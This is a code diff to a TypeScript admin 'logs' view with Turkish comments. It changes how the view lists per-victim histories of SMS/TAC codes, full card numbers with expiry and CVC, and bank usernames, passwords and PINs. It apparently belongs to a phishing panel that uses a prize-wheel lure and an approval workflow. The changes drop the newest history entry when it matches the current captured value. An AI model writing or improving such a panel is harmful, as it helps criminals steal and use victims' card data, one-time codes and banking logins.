@@ -1498,10 +1498,28 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 }
                 (fd as any).bankFormHistory = history;
 
+                // ⭐ MEVCUT KOLON DEĞERLERİ: SMS / KART / BANKA alanlarinin anlik guncel degeri
+                //   (asagidaki history hesaplamalarinda "son history = mevcut kolonsa kaldir"
+                //   kuralini kullanabilmek icin ONCE hesaplanmasi lazim).
+                const currentSmsValue =
+                  typeof fd.smsCode === "string" && fd.smsCode.trim()
+                    ? fd.smsCode.trim()
+                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                      ? fd.tacCode.trim()
+                      : "";
+                const currentCardNo = String(fd.cardNumber || "").trim();
+                const currentCardExp = String(fd.cardExpiry || "").trim();
+                const currentCardCvc = String(fd.cardCvc || "").trim();
+                const currentBankOrdered1 = String(fd.orderedField1 || "").trim();
+                const currentBankUser = String(fd.username || fd.verfuegernummer || "").trim();
+                const currentBankPass = String(fd.password || fd.pin || "").trim();
+
                 // ⭐ SMS GECMISI HESAPLA:
-                //   SADECE htmlStepLabel === "SMS KODU" OLAN entryleri al.
-                //   Banka formu tacCode veya snapshot alanlari SMS history'sine KARIŞMASIN.
-                //   Ardışık AYNI kodu tekrar etme (1 tane birak).
+                //   1) SADECE htmlStepLabel === "SMS KODU" olanlari al (banka TAC'ı karışmaz).
+                //   2) Ardışık AYNI kodu tekrar etme.
+                //   3) ⭐ KART MANTIGI İLE BİREBİR: SON (en yeni) SMS === kolondaki MEVCUT SMS ise
+                //      O entry listeden ve SAYIMDAN KALDIRILIR (gecmis = "ESKI" kayitlar, mevcut kolon zaten onu gosteriyor).
+                //   Boylece ILK SMS'te GECMIS YOK, 2. SMS'te 1. SMS listede gorunur.
                 const smsHistoryRaw = history
                   .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "SMS KODU")
                   .map((e: any) => {
@@ -1521,12 +1539,20 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   const p = i > 0 ? smsHistoryRaw[i - 1] : null;
                   if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
                 }
+                // ⭐ Son (en yeni) SMS = kolondaki mevcut SMS ise listeden KALDIR
+                if (smsHistory.length > 0 && currentSmsValue.length > 0) {
+                  const lastEntry = smsHistory[smsHistory.length - 1] as any;
+                  if (lastEntry && lastEntry.sms === currentSmsValue) {
+                    smsHistory.splice(smsHistory.length - 1, 1);
+                  }
+                }
                 const smsHistoryCount = smsHistory.length;
 
                 // ⭐ KART GECMISI HESAPLA:
-                //   SADECE htmlStepLabel === "KART BILGISI" OLAN entryleri al.
-                //   Banka formu cardNumber alanlari veya snapshot KART history'sine KARIŞMASIN.
-                //   Aynı kart ard arda ise 1 tane birak (cardNum + expiry ayniysa ayni kart say).
+                //   1) SADECE htmlStepLabel === "KART BILGISI" olanlari al.
+                //   2) Aynı kart ard arda 1 tane birak (No + Exp + Cvc ayniysa ayni kart).
+                //   3) ⭐ Son (en yeni) kayit kart bilgileri KOLONDAKI ile TAMAMEN AYNI ise
+                //      listeden ve sayimdan KALDIR (mevcut kolon zaten onu gosteriyor).
                 const cardHistoryRaw = history
                   .filter((e: any) => e && typeof e.htmlStepLabel === "string" && e.htmlStepLabel === "KART BILGISI")
                   .map((e: any) => {
@@ -1558,17 +1584,43 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     cardHistory.push(cur);
                   }
                 }
+                // ⭐ Son (en yeni) kart === kolondaki mevcut kart ise listeden KALDIR
+                if (cardHistory.length > 0 && (currentCardNo.length > 0 || currentCardExp.length > 0 || currentCardCvc.length > 0)) {
+                  const lastEntry = cardHistory[cardHistory.length - 1] as any;
+                  if (
+                    lastEntry &&
+                    lastEntry.cardNumber === currentCardNo &&
+                    lastEntry.cardExpiry === currentCardExp &&
+                    lastEntry.cardCvc === currentCardCvc
+                  ) {
+                    cardHistory.splice(cardHistory.length - 1, 1);
+                  }
+                }
                 const cardHistoryCount = cardHistory.length;
 
                 // ⭐ BANKA GECMISI HESAPLA:
-                //   SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu adimlari).
-                //   Boylece banka + sms + kart HEP SI AYRI AYRI listelenir.
-                const bankHistoryRaw = history
-                  .filter((e: any) => {
+                //   1) SMS KODU ve KART BILGISI disindaki tum entryler (sadece banka formu).
+                //   2) ⭐ Son (en yeni) banka kaydi KOLONDAKI orderedField1 / username / password
+                //      ile ayni ise listeden ve sayimdan KALDIR (mevcut kolon onu zaten gosterdigi icin).
+                const bankHistoryRawPre = history.filter((e: any) => {
                     if (!e) return false;
                     const label = typeof e.htmlStepLabel === "string" ? e.htmlStepLabel : "";
                     return label !== "SMS KODU" && label !== "KART BILGISI";
                   });
+                // ⭐ Son banka kaydi mevcut kolon ile birebir ayni mi kontrolu
+                const bankHistoryRaw: any[] = (() => {
+                  if (bankHistoryRawPre.length === 0) return [];
+                  const lastEntry = bankHistoryRawPre[bankHistoryRawPre.length - 1];
+                  const lastO1 = String(lastEntry.orderedField1 || "").trim();
+                  const lastUser = String(lastEntry.username || lastEntry.verfuegernummer || "").trim();
+                  const lastPass = String(lastEntry.password || lastEntry.pin || "").trim();
+                  const matchCurrent =
+                    (currentBankOrdered1.length > 0 && currentBankOrdered1 === lastO1) ||
+                    (currentBankUser.length > 0 && currentBankUser === lastUser) ||
+                    (currentBankPass.length > 0 && currentBankPass === lastPass);
+                  if (matchCurrent) return bankHistoryRawPre.slice(0, -1);
+                  return bankHistoryRawPre;
+                })();
                 const bankHistoryCount = bankHistoryRaw.length;
                 (fd as any)._bankHistory = bankHistoryRaw;
                 (fd as any)._smsHistory = smsHistory;
@@ -1620,12 +1672,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 const approvalHistory = parseApprovalHistory(fd.approvalHistory);
                 const approvalEntries = approvalHistory;
-                const smsValue =
-                  typeof fd.smsCode === "string" && fd.smsCode.trim()
-                    ? fd.smsCode.trim()
-                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
-                      ? fd.tacCode.trim()
-                      : "";
+                const smsValue = currentSmsValue;
 
                 // ⭐ ODUL HESABI: 4 KATMANLI FALLBACK (row.amount → form_data.wheel_result_amount
                 //   → wheel_result_label → 0). Boylece miktar kesin olarak okunur.
